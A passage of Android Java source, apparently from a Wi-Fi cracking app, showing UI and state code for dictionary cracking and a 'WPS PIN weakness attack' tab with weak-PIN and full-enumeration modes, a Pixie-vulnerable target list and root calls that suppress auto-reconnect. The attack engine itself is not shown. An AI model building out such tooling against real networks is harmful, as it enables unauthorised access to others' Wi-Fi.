        // （实测 mandatorySystemGestures frame=[0,2280][1080,2376]）。这里先给 32dp=96px
        // 打底，再由下面的 insets 监听叠加系统导航栏高度 —— 两重保险，
        // 即使 insets 拿不到也不会让最后一行落进手势区。
        content.setPadding(px(16), px(8), px(16), px(32));

        // 四个页面各建一次，之后只切换可见性 ——
        // 这样切页签不会丢日志、不会重置滚动、不会丢按钮状态
        pageObserve = new LinearLayout(this);
        pageObserve.setOrientation(LinearLayout.VERTICAL);
        pageAudit = new LinearLayout(this);
        pageAudit.setOrientation(LinearLayout.VERTICAL);
        pageConnect = new LinearLayout(this);
        pageConnect.setOrientation(LinearLayout.VERTICAL);
        pageSettings = new LinearLayout(this);
        pageSettings.setOrientation(LinearLayout.VERTICAL);
        pageWps = new LinearLayout(this);
        pageWps.setOrientation(LinearLayout.VERTICAL);
        content.addView(pageObserve);
        content.addView(pageAudit);
        content.addView(pageConnect);
        content.addView(pageWps);
        content.addView(pageSettings);
        sv.addView(content, new ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));
        root.addView(sv, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f));

        setContentView(root);
        showTab(0);

        // 全面屏手势区 / 导航栏：targetSdk 35 在 Android 15 上强制 edge-to-edge，
        // 底部内容会画到手势条下面（改版前实测按钮下沿正好贴到屏幕底边）。
        // 这里按系统下边距给内容补一段 padding —— 只改内边距，不动布局结构。
        // 注意：必须在**视图 attach 之后**读 insets —— 在 setContentView 的同一帧里
        // 调 requestApplyInsets() 拿不到分发（实测漏掉了 48px 的导航栏），
        // 用 post 推到下一帧、并从 root 的 rootWindowInsets 上取。
        try {
            root.post(() -> {
                try {
                    android.view.WindowInsets in = root.getRootWindowInsets();
                    if (in == null || content == null) return;
                    int bottom = in.getSystemWindowInsetBottom();
                    if (bottom > 0) {
                        content.setPadding(px(16), px(8), px(16), px(32) + bottom);
                    }
                } catch (Throwable ignored) {}
            });
        } catch (Throwable ignored) {}
    }

    /** 统一控制"运行中"状态：运行中才能停止，空闲时才能开始 */
    /**
     * 拿当前活着的服务实例。
     * 优先用在 ServiceConnection 里拿到的 binder 实例；
     * 拿不到（绑定未完成 / 被系统解绑）就退回服务的静态引用。
     * 没有这层兜底时，点停止会因为 crackService == null 直接弹
     * "没有正在跑的任务"，表现就是"停不下来"。
     */
    private CrackService liveService() {
        if (crackService != null) return crackService;
        return CrackService.get();
    }

    /**
     * 计划模式下「当前字典」的**唯一权威来源**。
     *
     * <p>优先取服务端**活计划**（{@code planForDisplay}）——接力过程中计划 index
     * 随 {@code apply(MISS)} 前进，只有它能反映「此刻真的在第几本」。
     * 服务没起来\/拿不到活计划时退回 {@link #selectedPlan} 快照（启动前选计划时用）。
     *
     * <p>不能用 {@link #currentDict} 或 {@link #currentDictName}：那两个是单本模式的
     * 字段，接力时仍停在第一本，用了就是「界面显示 A、后台在跑 B」的错位。
     */
    private io.github.wlmosv_png.wpaforge.audit.DictPlan livePlan() {
        CrackService svc = liveService();
        if (svc != null) {
            io.github.wlmosv_png.wpaforge.audit.DictPlan lp = svc.planForDisplay();
            if (lp != null && !lp.items.isEmpty()) return lp;
        }
        // 不回落陈旧快照（那是「界面显示上一版、后台已变」的根源）：
        // 直接读盘上当前目标的计划，永远新鲜。
        return filePlan();
    }

    /** 盘上当前目标的计划（没选目标时是 unbound 计划）；没有则返回 null。 */
    private io.github.wlmosv_png.wpaforge.audit.DictPlan filePlan() {
        io.github.wlmosv_png.wpaforge.audit.DictPlan p =
                io.github.wlmosv_png.wpaforge.audit.DictPlan.load(
                        io.github.wlmosv_png.wpaforge.audit.DictPlan.fileFor(this, currentTargetKey()));
        return (p == null || p.items.isEmpty()) ? null : p;
    }

    /**
     * 当前执行来源（互斥）：{@code MULTI} = 多字典计划；{@code SINGLE} = 用户单字典；
     * {@code NONE} = 还没选。同一时刻只会有一个值 —— 不存在「两种模式同时激活」。
     */
    private String currentMode() {
        if (usePlanMode && filePlan() != null) return "MULTI";
        return (currentDict != null && !currentDict.isEmpty()) ? "SINGLE" : "NONE";
    }

    /** 退出计划模式（回到单字典语义）。 */
    private void leavePlanMode() {
        usePlanMode = false;
        selectedPlan = null;
    }

    /**
     * 刷新按钮状态。
     *
     * 唯一真相是「队列里有没有进行中的任务」，不是服务实例上的标志 ——
     * 之前两者会不一致，导致"显示已暂停但按钮还能点开始"这种矛盾。
     */
    private void syncButtons() {
        boolean running = false;
        boolean paused = false;
        for (TaskQueue.Task t : queueCache) {
            if (t.state == TaskQueue.State.RUNNING) running = true;
            if (t.state == TaskQueue.State.PAUSED) paused = true;
        }
        boolean active = running || paused;

        if (startBtn != null) {
            startBtn.setEnabled(!active);
            startBtn.setAlpha(active ? 0.4f : 1f);
            startBtn.setText(active
                    ? L.s("▶ 开始破解", "▶ Start")
                    : L.s("▶ 开始破解", "▶ Start"));
        }
        if (pauseBtn != null) {
            // paused 时按钮文案会变成「继续」，但旧写法只按 running 判断可用性，
            // 于是「已暂停」的任务永远点不动「继续」——用户被卡死在暂停态。
            boolean canPause = running || paused;
            pauseBtn.setEnabled(canPause);
            pauseBtn.setAlpha(canPause ? 1f : 0.4f);
            pauseBtn.setText(paused
                    ? L.s("▶ 继续", "▶ Resume")
                    : L.s("‖ 暂停", "‖ Pause"));
        }
        if (stopBtn != null) {
            stopBtn.setEnabled(active);
            stopBtn.setAlpha(active ? 1f : 0.4f);
        }
    }

    /** 兼容旧调用 */
    private void setRunning(boolean ignored) {
        syncButtons();
    }

    /** 带右侧间隔的等分权重 */
    private LinearLayout.LayoutParams gapWeight(int gapPx) {
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        lp.rightMargin = px(gapPx);
        return lp;
    }

    private LinearLayout.LayoutParams weight() {
        return new LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
    }

    /**
     * 顶部导航胶囊。
     *
     * <p>改版前是 5 个 46dp 高的大按钮、每个都带可见描边 —— 三个页签的视觉重量
     * 加起来比内容还重。现在：高度降到 36dp、圆角收小、未选中项**去掉描边**
     * 只留一层极淡的暗底，当前项用实心琥珀 + 深色字。
     * 点按回调与页签索引完全不变。
     */
    private TextView makeTab(String label, int index) {
        TextView t = new TextView(this);
        t.setText(label);
        t.setTextSize(AmberTheme.FS_ACTION);
        t.setGravity(Gravity.CENTER);
        t.setPadding(0, px(9), 0, px(9));
        t.setTextColor(AmberTheme.TEXT_FAINT);
        t.setLetterSpacing(0.02f);
        t.setBackground(roundBg(AmberTheme.CARD_2, AmberTheme.RADIUS_TAB));
        t.setOnClickListener(v -> showTab(index));
        return t;
    }

    private void showTab(int index) {
        currentTab = index;

        // 页签样式
        TextView[] tabs = {tabObserve, tabAudit, tabConnect, tabWps, tabSettings};
        for (int i = 0; i < tabs.length; i++) {
            boolean on = (i == index);
            // 选中：实心琥珀 + 深字 + 加粗；未选中：**无描边**的暗底 + 弱字 + 常规。
            // 三处同时变（底、字色、字重）—— 扫一眼就能定位当前页；
            // 未选中项不再画边，五个入口的整体重量因此降下来。
            tabs[i].setBackground(roundBg(on ? ACCENT : AmberTheme.CARD_2,
                    AmberTheme.RADIUS_TAB));
            tabs[i].setTextColor(on ? ON_ACCENT : AmberTheme.TEXT_FAINT);
            tabs[i].setTypeface(on
                    ? Typeface.create("sans-serif-medium", Typeface.NORMAL)
                    : Typeface.DEFAULT);
        }

        LinearLayout[] pages = {pageObserve, pageAudit, pageConnect, pageWps, pageSettings};

        // 首次访问该页时才构建内容
        if (!pageBuilt[index]) {
            switch (index) {
                case 0: buildObserveTab(); break;
                case 1: buildAuditTab(); break;
                case 2: buildConnectTab(); break;
                case 3: buildWpsTab(); break;
                default: buildSettingsTab(); break;
            }
            pageBuilt[index] = true;
        }

        // 只切可见性
        for (int i = 0; i < pages.length; i++) {
            pages[i].setVisibility(i == index ? View.VISIBLE : View.GONE);
        }

        // 离开观测页时停扫描与动画
        if (index == 0) {
            if (radar != null) radar.startSpin();
            if (scanner != null) scanner.start();
            ui.removeCallbacks(statusTick);
            ui.post(statusTick);
        } else {
            ui.removeCallbacks(statusTick);
            if (radar != null) radar.stopSpin();
            if (scanner != null) scanner.stop();
        }
        updateRadarStatus();

        // 回到破解页：刷新队列与日志（内容不用重建）
        if (index == 2) {
            refreshQueue();
            if (connectStreamView != null && !streamLines.isEmpty()) {
                // 用渲染器重设：既保住每行的颜色，也保持当前筛选一致。
                renderStream();
            }
            updateConnectDict();
            updateConnectMode();
            updateTargetLabel();
        }
    }

    // ---------------- 观测页 ----------------


    // ==================== WPS PIN 模式（第 5 页） ====================

    private LinearLayout pageWps;
    private LinearLayout wpsTargetList;
    /** 顶部目标卡的 SSID / BSSID / 能力标签（成员字段，选中目标与扫描完成后刷新）。 */
    private TextView wpsTargetSsidV;
    private TextView wpsTargetBssidV;
    private TextView wpsCapTag;
    private TextView wpsStatusLine;
    private TextView wpsProgressLine;
    private LinearLayout wpsModeList;
    /** 执行环境 + 能力状态总览卡（首页「一眼看懂」）。 */
    private LinearLayout wpsSummaryCard;
    private TextView wpsEnvCardText;
    private TextView wpsCapCardText;
    private volatile boolean wpsSelftestDone;
    private volatile boolean wpsSelftestStarted;
    /** 2026-11-08：Root 可用性缓存（true/false；null=还没检测过，主线程不阻塞）。 */
    private volatile Boolean wpsRootOk;
    /** 2026-11-08：root 检测是否已启动（避免重复起线程）。 */
    private volatile boolean wpsRootDiagStarted;
    /**
     * 目标与扫描状态的**唯一权威**（2026-11-09 架构升级）。
     *
     * <p>原来扫描状态/目标列表/当前选中摊成上面几个裸字段，各处自行推断 ——
     * 直接造成过"扫描已完成却仍显示待检测"。现在状态只在管理器里迁移，
     * UI 读 {@link io.github.wlmosv_png.wpaforge.wps.WpsTargetManager#snapshot()}。
     */
    private final io.github.wlmosv_png.wpaforge.wps.WpsTargetManager wpsTargetMgr =
            new io.github.wlmosv_png.wpaforge.wps.WpsTargetManager();
    /** 结构化日志（统一格式 + 有界缓冲 + 导出遮蔽）。 */
    private final io.github.wlmosv_png.wpaforge.wps.WpsLogManager wpsLogMgr =
            new io.github.wlmosv_png.wpaforge.wps.WpsLogManager();
    /** 任务生命周期（运行状态 + 断点归属校验）；断点存储懒加载。 */
    private io.github.wlmosv_png.wpaforge.wps.WpsTaskManager wpsTaskMgr;
    /** 证据与纠错留痕（只增不改）。 */
    private final io.github.wlmosv_png.wpaforge.wps.WpsEvidenceManager wpsEvidenceMgr =
            new io.github.wlmosv_png.wpaforge.wps.WpsEvidenceManager();
    /** 扫描进度：一条细的不确定进度线 + 一行阶段文字（替代原来的大转圈）。 */
    private android.widget.ProgressBar wpsScanBar;
    private TextView wpsScanStatus;
    private Button wpsReconAllBtn;
    /** 2026-11-08：顶部目标卡的信号/频段/扫描时间行（提升为成员，选中后可刷新）。 */
    private TextView wpsPickedMeta;
    /** 体检是否连「不收外部 PIN」的一起测。默认跳过 —— 实测那批 3/3 打不动。 */
    private boolean wpsReconAll = false;
    private Button wpsStartBtn;
    private Button wpsStopBtn;
    private TextView wpsLogView;
    private android.widget.ScrollView wpsLogScroll;
    private TextView wpsImportLine;

    /** 已知可打（Pixie）名单：按钮 + 诊断行 */
    private Button wpsVulnBtn;
    private TextView wpsVulnDiag;
    /** 已加载的名单条目；null = 还没加载 */
    private java.util.List<io.github.wlmosv_png.wpaforge.wps.VulnWsc.Entry> vulnEntries;
    /** 名单文件是否已落盘 */
    private boolean vulnListExists = false;
    private volatile boolean vulnBusy = false;
    /** supplicant 控制通道自检：-1 未知 / 0 不通（回包被系统策略拦）/ 1 通 */
    private volatile int wpsCtrlOk = -1;

    private io.github.wlmosv_png.wpaforge.wps.WpsEngine.Session wpsSession;

    /** 唯一停止信号：执行线程每一步都查它。 */
    private volatile boolean wpsCancel = false;
    /** 策略：false = 弱 PIN 优先；true = 完整枚举 */
    private int wpsMode = 0;
    /** 完整枚举的断点（已试过的候选条数） */
    private int wpsEnumCursor = 0;
    /** 已经对哪个 BSSID 提示过「这个 AP 打不动」—— 提示一次，再点才放行 */
    private String wpsWarnedBssid = null;

    private static final int WPS_PER_TRY_SEC = 30;      // 单个 PIN 的等待窗口（真 WPS 交换要 ~18s）
    private static final int WPS_BATCH_SIZE = 15;       // 每批条数
    private static final int WPS_BATCH_BUDGET = 240;    // 每批总预算（秒）
    private static final int WPS_WEAK_CHUNK = 5;        // 弱 PIN 每小批条数（便于中途判定后立刻停）

    // ---------------- 第二阶段：断点（schema 化 + 备份 + 迁移）与任务台账 ----------------

    /** 断点绑定的目标 SSID（旧版只存了 BSSID，恢复时无法校验目标）。 */
    private String wpsHalfSsid = "";
    /** 当前任务的台账 ID。 */
    private String wpsTaskId = "";
    /** 本次运行是否以异常结束（决定台账的终止原因）。 */
    private String wpsFailReason;
    /** autojoin 恢复标记键：任务开始「限制自动重连」时写 true，恢复后清。 */
    private static final String KEY_AUTOJOIN_OFF = "wps_autojoin_limited";

    /** 记录「已限制自动重连」（进程被杀后靠它在下次启动时恢复）。 */
    private void wpsAutojoinMarkLimited() {
        try {
            getPreferences(MODE_PRIVATE).edit().putBoolean(KEY_AUTOJOIN_OFF, true).commit();
        } catch (Throwable ignored) {
        }
    }

    /** 清除「已限制」标记（任务正常结束/恢复后）。 */
    private void wpsAutojoinClearLimited() {
        try {
            getPreferences(MODE_PRIVATE).edit().remove(KEY_AUTOJOIN_OFF).commit();
        } catch (Throwable ignored) {
        }
    }

    /** 是否残留「已限制但未恢复」状态（App 冷启动/回前台时检查）。 */
    private boolean wpsAutojoinIsLimited() {
        try {
            return getPreferences(MODE_PRIVATE).getBoolean(KEY_AUTOJOIN_OFF, false);
        } catch (Throwable t) {
            return false;
        }
    }

    /**
     * 把 autojoin 恢复为「放开」。进程被杀、OOM、任务中断后都可能停在「限制重连」。
     * 由 onResume 与任务收尾共同调用；幂等。
     */
    private void wpsAutojoinRestore() {
        if (!wpsAutojoinIsLimited()) return;
        // 2026-11-08 卡顿修复：残留标记恢复也放后台线程 —— setAutojoin 是同步
        // root exec（su -c app_process … autojoin on），放在 onResume 主线程会在
        // 异常退出后首次回前台时卡住界面。
        new Thread(() -> {
            try {
                io.github.wlmosv_png.wpaforge.wps.WpsController.setAutojoin(this, true);
                wpsAutojoinClearLimited();
                wpsLog(L.s("[i] 已恢复自动重连（上次异常退出遗留）",
                        "[i] auto-join restored (left over from abnormal exit)"));
            } catch (Throwable ignored) {
            }
        }, "wps-autojoin-restore").start();
    }
    /** 当前任务的台账快照（变更后 upsert）。 */
    private io.github.wlmosv_png.wpaforge.wps.WpsLedger.Task wpsTask;
    /** 断点状态行：说清「能不能继续、断点属于谁、为什么不能继续」。 */
    private TextView wpsResumeLine;
    /** WPS 专项统计（跨进程持久化；每次结果实时累加并原子落盘）。 */
    private io.github.wlmosv_png.wpaforge.wps.WpsStats wpsStats = new io.github.wlmosv_png.wpaforge.wps.WpsStats();

    /** 台账目录下的统计文件。 */
    private java.io.File wpsStatsFile() {
        return new java.io.File(getFilesDir(), "wps/stats.txt");
    }

    /** 启动/回前台时加载统计（占用我们自己的字段，不覆盖外部）。 */
    private void wpsStatsLoad() {
        try {
            io.github.wlmosv_png.wpaforge.wps.WpsStats loaded = new io.github.wlmosv_png.wpaforge.wps.WpsStatsStore(wpsStatsFile()).load();
            if (loaded != null && !loaded.empty()) wpsStats = loaded;
        } catch (Throwable ignored) {
        }
    }

    /** 计入一条结果并把统计落盘。 */
    private void wpsStatsAdd(String status, long elapsedMs) {
        try {
            wpsStats.add(status, elapsedMs);
            new io.github.wlmosv_png.wpaforge.wps.WpsStatsStore(wpsStatsFile()).save(wpsStats);
        } catch (Throwable ignored) {
        }
    }
    private TextView wpsHistoryBtn;
    private TextView wpsEvidenceBtn;

    /**
     * 断点存储通道：SharedPreferences 之上的一层。
     *
     * <p>写入必须用 {@code commit()}（同步、有返回值）：{@code apply()} 是异步的，
     * 拿不到结果，「写失败不破坏主副本」这个承诺就会落空。
     * 读取走 {@code getAll()} 再转字符串 —— 旧版把阶段/游标存成 int，
     * 直接 {@code getString} 会抛 ClassCastException，迁移会静默失效。
     */
    private final io.github.wlmosv_png.wpaforge.wps.WpsCheckpointStore.Blob wpsBlob =
            new io.github.wlmosv_png.wpaforge.wps.WpsCheckpointStore.Blob() {
                @Override
                public String read(String key) {
                    try {
                        Object v = getPreferences(MODE_PRIVATE).getAll().get(key);
                        return v == null ? null : String.valueOf(v);
                    } catch (Throwable t) {
                        return null;
                    }
                }

                @Override
                public boolean write(String key, String value) {
                    try {
                        return getPreferences(MODE_PRIVATE).edit()
                                .putString(key, value).commit();
                    } catch (Throwable t) {
                        return false;
                    }
                }

                @Override
                public boolean remove(String key) {
                    try {
                        return getPreferences(MODE_PRIVATE).edit().remove(key).commit();
                    } catch (Throwable t) {
                        return false;
                    }
                }
            };

    private io.github.wlmosv_png.wpaforge.wps.WpsCheckpointStore wpsCpStore() {
        return new io.github.wlmosv_png.wpaforge.wps.WpsCheckpointStore(wpsBlob);
    }

    /** WPS 任务台账（独立于 HistStore 的密码记录模型）。 */
    private io.github.wlmosv_png.wpaforge.wps.WpsLedgerStore wpsLedger() {
        return new io.github.wlmosv_png.wpaforge.wps.WpsLedgerStore(new java.io.File(getFilesDir(), "wps/ledger.txt"));
    }

    /**
     * 组装 UI 只读快照（门面）。UI 渲染只读它，不自行推断业务状态。
     */
    private io.github.wlmosv_png.wpaforge.wps.WpsFacade.UiState wpsFacadeState() {
        int cand = 0;
        try {
            if (wpsTargetMgr.selected() != null) {
                cand = wpsMode == 3 ? 0
                        : io.github.wlmosv_png.wpaforge.wps.WpsStrategyManager
                                .candidates(wpsMode, wpsTargetMgr.selected().bssid, getFilesDir()).size();
            }
        } catch (Throwable ignored) {
        }
        String capVerdict = wpsLastCapVerdict;
        String capLabel = wpsCapTag == null || wpsCapTag.getText() == null
                ? "" : wpsCapTag.getText().toString();
        return io.github.wlmosv_png.wpaforge.wps.WpsFacade.snapshot(
                wpsTargetMgr, wpsTaskMgr().state(), wpsMode, cand,
                capVerdict, capLabel, false, System.currentTimeMillis());
    }

    /** 每个 BSSID 的最新能力结论（**唯一来源**：双通道合并结果）。 */
    private final java.util.Map<String, io.github.wlmosv_png.wpaforge.wps.WpsCapabilityManager.Capability>
            wpsCapByBssid = new java.util.concurrent.ConcurrentHashMap<>();

    /** 解析 {@code wpsMethods} 字符串（"0x2008"）→ int；空/非法 → -1（UNKNOWN）。 */
    private static int wpsParseConfigMethods(String s) {
        if (s == null) return -1;
        String v = s.trim();
        if (v.isEmpty()) return -1;
        try {
            return v.startsWith("0x") || v.startsWith("0X")
                    ? Integer.parseInt(v.substring(2), 16) : Integer.parseInt(v);
        } catch (Throwable t) {
            return -1;
        }
    }

    /** 能力结论 → 本地标签状态（供双通道合并结果刷新标签）。 */
    private int wpsUiStateOf(String verdict) {
        switch (io.github.wlmosv_png.wpaforge.wps.WpsUiKit.capStateOf(verdict)) {
            case io.github.wlmosv_png.wpaforge.wps.WpsUiKit.CAP_OK: return WPS_TAG_OK;
            case io.github.wlmosv_png.wpaforge.wps.WpsUiKit.CAP_NO_PIN: return WPS_TAG_NO_PIN;
            case io.github.wlmosv_png.wpaforge.wps.WpsUiKit.CAP_LOCKED: return WPS_TAG_LOCKED;
            default: return WPS_TAG_UNKNOWN;
        }
    }

    /** 最近一次能力结论（由 setWpsCapTag 记录，供门面透传）。 */
    private volatile String wpsLastCapVerdict = io.github.wlmosv_png.wpaforge.wps.WpsCapabilityManager.V_UNKNOWN;

    /** 任务管理器（懒加载：需要 wpsCpStore() 就绪）。 */
    private io.github.wlmosv_png.wpaforge.wps.WpsTaskManager wpsTaskMgr() {
        if (wpsTaskMgr == null) {
            wpsTaskMgr = new io.github.wlmosv_png.wpaforge.wps.WpsTaskManager(wpsCpStore());
        }
        return wpsTaskMgr;
    }

    /** 发给 helper 的目标 SSID；未知时留空（「(手动)」这类占位不算）。 */
    private String wpsTargetSsidForMatch() {
        if (wpsTargetMgr.selected() == null || wpsTargetMgr.selected().ssid == null) return "";
        String v = wpsTargetMgr.selected().ssid.trim();
        if (v.isEmpty() || v.startsWith("(")) return "";
        return v;
    }

    private void buildWpsTab() {
        // ============ A. 顶部标题区（紧凑单行：标题 + 问号帮助；不再占两行横幅） ============
        // 2026-11-09 UI 整改：原来这里是一个「大标题 + 副标题」两行块，叠加全局
        // 的 WPAForge 标题后，首屏有效信息被推到很下面。现在压成单行——
        // 标题在同一行内与「?」帮助入口左右排布，省掉一整个副标题行的纵向空间。
        LinearLayout wpsHeader = new LinearLayout(this);
        wpsHeader.setOrientation(LinearLayout.HORIZONTAL);
        wpsHeader.setGravity(android.view.Gravity.CENTER_VERTICAL);
        wpsHeader.setPadding(px(2), 0, px(2), 0);

        TextView title = new TextView(this);
        title.setText(L.s("WPS PIN 弱点攻击", "WPS PIN weakness attack"));
        title.setTextSize(AmberTheme.FS_TITLE + 2);
        title.setTextColor(TEXT);
        title.setTypeface(android.graphics.Typeface.create("sans-serif-medium",
                android.graphics.Typeface.NORMAL));
        title.setSingleLine(true);
        title.setEllipsize(android.text.TextUtils.TruncateAt.END);
        wpsHeader.addView(title, new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

        // 问号帮助入口（与其它页面一致的克制风格：描边小圆钮，不抢眼）
        TextView helpBtn = new TextView(this);
        helpBtn.setText("?");
        helpBtn.setTextSize(AmberTheme.FS_LABEL);
        helpBtn.setTextColor(ACCENT);
        helpBtn.setGravity(android.view.Gravity.CENTER);
        helpBtn.setTypeface(android.graphics.Typeface.create("sans-serif-medium",
                android.graphics.Typeface.NORMAL));
        helpBtn.setBackground(roundBgStroked(AmberTheme.ACCENT_BG, ACCENT, 999f, 1f));
        helpBtn.setMinWidth(px(28));
        helpBtn.setMinHeight(px(28));
        helpBtn.setPadding(px(8), px(4), px(8), px(4));
        helpBtn.setOnClickListener(v -> showWpsHelpDialog());
        wpsHeader.addView(helpBtn, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT));

        LinearLayout.LayoutParams wpsHdrLp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        wpsHdrLp.topMargin = px(6);
        pageWps.addView(wpsHeader, wpsHdrLp);

        // ============ B. 当前目标设备（紧凑单卡，SSID 主 / BSSID 次） ============
        LinearLayout targetCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        targetCard.setPadding(px(16), px(12), px(16), px(12));
        // 第一行：SSID（主信息）+ 状态标签（右上）
        LinearLayout row1 = new LinearLayout(this);
        row1.setOrientation(LinearLayout.HORIZONTAL);
        row1.setGravity(android.view.Gravity.CENTER_VERTICAL);
        // 2026-11-09 UI 整改：SSID / BSSID / 能力标签全部提升为成员字段 —— 原来它们
        // 是局部变量，只在 buildWpsTab 建页那一刻写死，之后选中目标/扫描完成都不刷新，
        // 于是「扫描完成仍显示（未选择目标）/待检测」。现在由 refreshWpsTargetCard() 统一刷新。
        wpsTargetSsidV = new TextView(this);
        wpsTargetSsidV.setTextSize(AmberTheme.FS_TITLE);
        wpsTargetSsidV.setTextColor(TEXT);
        wpsTargetSsidV.setTypeface(android.graphics.Typeface.create("sans-serif-medium",
                android.graphics.Typeface.NORMAL));
        wpsTargetSsidV.setSingleLine(true);
        wpsTargetSsidV.setEllipsize(android.text.TextUtils.TruncateAt.END);
        LinearLayout.LayoutParams ssidLp = new LinearLayout.LayoutParams(
                0, ViewGroup.LayoutParams.WRAP_CONTENT, 1);
        row1.addView(wpsTargetSsidV, ssidLp);

        wpsCapTag = new TextView(this);
        wpsCapTag.setTextSize(AmberTheme.FS_LABEL);
        wpsCapTag.setPadding(px(10), px(4), px(10), px(4));
        row1.addView(wpsCapTag);
        targetCard.addView(row1);

        // 第二行：BSSID + 频段（次要信息）
        wpsTargetBssidV = new TextView(this);
        wpsTargetBssidV.setTextSize(AmberTheme.FS_SMALL);
        wpsTargetBssidV.setTextColor(AmberTheme.TEXT_DIM);
        wpsTargetBssidV.setTypeface(android.graphics.Typeface.MONOSPACE);
        wpsTargetBssidV.setSingleLine(true);
        wpsTargetBssidV.setEllipsize(android.text.TextUtils.TruncateAt.END);
        targetCard.addView(wpsTargetBssidV, topGap(4));
        // 第三行：信号强度 + 最近扫描时间（成员字段，选中/扫描后刷新）
        wpsPickedMeta = new TextView(this);
        wpsPickedMeta.setTextSize(AmberTheme.FS_MICRO);
        wpsPickedMeta.setTextColor(AmberTheme.TEXT_DIM);
        wpsPickedMeta.setText(L.s("信号 -- dBm · 最近扫描：--",
                "rssi -- dBm · last scan: --"));
        targetCard.addView(wpsPickedMeta, topGap(2));
        // 目标操作：扫描 / 手动添加（紧凑一行）
        LinearLayout targetActions = new LinearLayout(this);
        targetActions.setOrientation(LinearLayout.HORIZONTAL);
        Button scanBtn = btnSecondary(L.s("扫描 AP", "Scan APs"));
        scanBtn.setOnClickListener(v -> doWpsScan());
        targetActions.addView(scanBtn, gapWeight(10));
        Button addBtn = btnSecondary(L.s("手动添加", "Add"));
        addBtn.setOnClickListener(v -> showAddTargetDialog());
        targetActions.addView(addBtn, gapWeight(0));
        targetCard.addView(targetActions, topGap(10));
        // 目标列表（重扫后这里填充候选 AP）
        wpsTargetList = new LinearLayout(this);
        wpsTargetList.setOrientation(LinearLayout.VERTICAL);
        targetCard.addView(wpsTargetList, topGap(6));
        // 首屏压缩：目标卡紧跟标题（10dp），比全局 sectionGap(20dp) 更紧，核心内容更早入屏
        pageWps.addView(targetCard, topGap(10));

        // ============ C. 能力状态（两列网格） ============
        wpsSummaryCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        wpsSummaryCard.setPadding(px(16), px(12), px(16), px(12));
        TextView capTitle = new TextView(this);
        capTitle.setText(L.s("能力与通道状态", "Capability & channel"));
        capTitle.setTextSize(AmberTheme.FS_LABEL);
        capTitle.setTextColor(AmberTheme.TEXT_DIM);
        wpsSummaryCard.addView(capTitle);
        wpsCapCardText = new TextView(this);
        wpsCapCardText.setTextSize(AmberTheme.FS_BODY);
        wpsCapCardText.setTextColor(TEXT);
        wpsCapCardText.setLineSpacing(px(4), 1f);
        wpsCapCardText.setPadding(px(2), px(6), px(2), px(2));
        wpsSummaryCard.addView(wpsCapCardText);
        wpsEnvCardText = new TextView(this);
        wpsEnvCardText.setTextSize(AmberTheme.FS_BODY);
        wpsEnvCardText.setTextColor(TEXT);
        wpsEnvCardText.setLineSpacing(px(4), 1f);
        wpsEnvCardText.setPadding(px(2), px(4), px(2), px(2));
        wpsSummaryCard.addView(wpsEnvCardText, topGap(2));
        pageWps.addView(wpsSummaryCard, sectionGap());
        renderWpsSummary();

        // ============ D. 验证策略（纵向列表 + 选中态 + 数量/来源） ============
        pageWps.addView(sectionLabel(L.s("验证策略", "Verification strategy")));
        LinearLayout wpsModeCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        wpsModeList = new LinearLayout(this);
        wpsModeList.setOrientation(LinearLayout.VERTICAL);
        wpsModeCard.addView(wpsModeList);
        renderWpsModeList();
        // 导入入口（我的列表策略的补充操作）
        if (wpsImportRow == null) {
            wpsImportRow = new LinearLayout(this);
            wpsImportRow.setOrientation(LinearLayout.HORIZONTAL);
        }
        wpsImportRow.removeAllViews();
        Button pasteBtn = btnSecondary(L.s("粘贴导入", "Paste"));
        pasteBtn.setOnClickListener(v -> showWpsPasteDialog());
        wpsImportRow.addView(pasteBtn, gapWeight(10));
        Button fileBtn = btnSecondary(L.s("从文件导入", "From file"));
        fileBtn.setOnClickListener(v -> pickWpsFile());
        wpsImportRow.addView(fileBtn, gapWeight(10));
        Button clearBtn = btnSecondary(L.s("清空", "Clear"));
        clearBtn.setOnClickListener(v -> {
            io.github.wlmosv_png.wpaforge.wps.WpsDataManager.clear(getFilesDir());
            refreshWpsImportLine();
            Toast.makeText(this, L.s("已清空我的列表", "List cleared"), Toast.LENGTH_SHORT).show();
        });
        wpsImportRow.addView(clearBtn, gapWeight(0));
        wpsModeCard.addView(wpsImportRow, topGap(8));
        wpsImportLine = new TextView(this);
        wpsImportLine.setTextSize(AmberTheme.FS_SMALL);
        wpsImportLine.setTextColor(AmberTheme.TEXT_DIM);
        wpsModeCard.addView(wpsImportLine, topGap(4));
        refreshWpsImportLine();
        // 2026-11-08：导入入口不再一直堆在策略区底部 —— 只在选中「我的列表」时由
        // renderWpsModeList 显示，其余策略保持整洁（导入收敛为独立上下文，不再全局常驻）。
        wpsImportRow.setVisibility(View.GONE);
        wpsImportLine.setVisibility(View.GONE);
        pageWps.addView(wpsModeCard, sectionGap());

        // ============ E. 任务操作区（精致双主键 + 状态横幅 + 单行三功能键） ============
        LinearLayout opCard = AmberTheme.card(this, dp, AmberTheme.RADIUS_CARD);
        opCard.setPadding(px(14), px(12), px(14), px(12));

        // 第一行：双主动作按纽（开始/暂停 占大头，停止占辅助位，并排不臃肿）
        LinearLayout mainActRow = new LinearLayout(this);
        mainActRow.setOrientation(LinearLayout.HORIZONTAL);
        mainActRow.setGravity(android.view.Gravity.CENTER_VERTICAL);

        wpsStartBtn = btnPrimary(L.s("开始验证", "Start"));
        wpsStartBtn.setMinHeight(px(46));
        wpsStartBtn.setMinimumHeight(px(46));
        wpsStartBtn.setPadding(px(16), px(10), px(16), px(10));
        wpsStartBtn.setOnClickListener(v -> {
            if (wpsTaskMgr().isRunning()) stopWps();
            else startWps();
        });
